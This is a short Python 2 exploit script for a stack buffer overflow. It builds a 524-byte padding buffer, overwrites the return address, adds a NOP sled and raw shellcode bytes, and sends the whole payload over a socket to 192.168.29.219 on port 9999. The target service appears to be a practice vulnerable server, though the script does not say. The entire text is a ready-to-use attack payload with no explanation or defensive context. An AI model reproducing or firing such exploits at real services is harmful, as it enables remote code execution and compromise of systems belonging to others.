import socket

buf="A"*524
#eip 35724134
#offset 524
ret="\xf3\x12\x17\x31"
shellcode=("\xba\x76\x80\x12\x8f\xdd\xc3\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x12\x31\x50\x12\x03\x50\x12\x83\x9e\x7c\xf0\x7a\x6f\xa6\x02"
"\x67\xdc\x1b\xbe\x02\xe0\x12\xa1\x63\x82\xe9\xa2\x17\x13\x42"
"\x9d\xda\x23\xeb\x9b\x1d\x4b\x2c\xf3\xc3\xb6\xc4\x06\xfc\xd7"
"\x84\x8e\x1d\x57\xc2\xc0\x8c\xc4\xb8\xe2\xa7\x0b\x73\x64\xe5"
"\xa3\xe2\x4a\x79\x5b\x93\xbb\x52\xf9\x0a\x4d\x4f\xaf\x9f\xc4"
"\x71\xff\x2b\x1a\xf1")
print shellcode

nops="\x90"*10

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    conn=s.connect(("192.168.29.219",9999))
    k=s.recv(1024)
    print k 
    s.send(buf+ret+nops+shellcode)
except:
    print "some error"
    


